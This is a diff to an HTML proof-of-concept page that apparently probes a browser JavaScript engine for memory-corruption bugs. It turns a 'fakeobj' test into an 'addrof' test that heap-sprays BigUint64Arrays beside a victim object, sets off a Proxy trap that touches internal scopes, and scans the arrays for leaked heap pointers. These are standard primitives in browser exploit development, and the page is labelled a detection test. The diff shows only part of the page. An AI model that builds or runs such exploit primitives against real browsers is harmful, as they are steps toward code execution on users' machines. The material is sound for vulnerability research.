@@ -1,30 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FakeObj Detection PoC</title>
+    <title>addrof Detection via BigUint64Array</title>
     <script>
         function log(msg) {
             document.body.innerHTML += msg + "<br>";
         }
 
         window.onload = () => {
-            log("Starting fakeobj detection test...");
+            log("Starting addrof detection test...");
 
-            // Victim object we want to overwrite
-            let victim = { val: 13.37 };
+            // Controlled object we want to find the address of
+            const victim = { val: 13.37 };
 
-            // Heap spray to increase odds of adjacency
+            // Heap spray with BigUint64Arrays to increase chance of adjacency
             const sprayCount = 2000;
             let spray = [];
             for (let i = 0; i < sprayCount; i++) {
-                spray.push(new Float64Array(4));
+                spray.push(new BigUint64Array(4));
             }
 
             // Add victim near sprayed arrays
             spray.push(victim);
-            spray.push(new Float64Array(10));
+            spray.push(new BigUint64Array(10));
 
-            // Trigger Proxy + with-block to touch internal scopes
+            // Set up Proxy trap to touch internal scopes
             let callCount = 0;
 
             const handler = {
@@ -64,15 +64,23 @@
                 }
             })();
 
-            // Check if victim object was overwritten
-            log("Victim after: " + JSON.stringify(victim));
-            log("Victim.val = " + victim.val);
-            log("Victim.toString = " + victim.toString);
+            // Scan sprayed arrays for leaked pointers
+            log("Scanning for leaked pointers...");
+            for (let arr of spray) {
+                if (arr instanceof BigUint64Array) {
+                    for (let i = 0; i < arr.length; i++) {
+                        let val = arr[i];
+                        if (val > 0x1000 && val < BigInt("0x800000000000")) {
+                            log(`Possible leaked pointer at arr[${i}] = 0x${val.toString(16)}`);
+                        }
+                    }
+                }
+            }
         };
     </script>
 </head>
 <body>
-    <h2>FakeObj Detection Test</h2>
-    <p>Trying to detect heap overwrites or metadata corruption.</p>
+    <h2>addrof Detection Test</h2>
+    <p>Trying to detect leaked pointers using BigUint64Array heap spraying.</p>
 </body>
 </html>
